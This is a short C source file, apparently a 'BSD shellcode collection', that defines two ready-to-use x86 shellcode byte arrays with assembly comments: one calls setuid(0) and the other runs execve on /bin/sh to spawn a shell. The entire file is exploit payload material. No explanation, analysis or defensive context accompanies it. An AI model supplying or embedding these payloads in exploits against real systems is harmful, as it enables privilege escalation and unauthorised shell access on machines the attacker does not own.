/*
 * bsd shellcode collection
 * written by bind@insidiae.org
 */

char setuid[] = 
  "\x31\xc0"			/* xorl %eax, %eax */
  "\x50"			/* pushl %eax      */
  "\x50"			/* pushl %eax      */
  "\xb0\x17"			/* movl $23, %al   */
  "\xcd\x80";		        /* int $0x80       */

char execve[] =
  "\x31\xc0"			/* xorl %eax,%eax    */
  "\x50"       			/* pushl %eax        */
  "\x68\x2f\x2f\x73\x68" 	/* pushl $0x68732f2f */
  "\x68\x2f\x62\x69\x6e"	/* pushl $0x6e69622f */
  "\x89\xe3"			/* movl %esp,%ebx    */
  "\x50"			/* pushl %eax        */
  "\x54"			/* pushl %esp        */
  "\x53"			/* pushl %ebx	     */
  "\x50"			/* pushl %eax        */
  "\xb0\x3b"			/* movb $0x3b,%al    */
  "\xcd\x80";			/* int $0x80         */
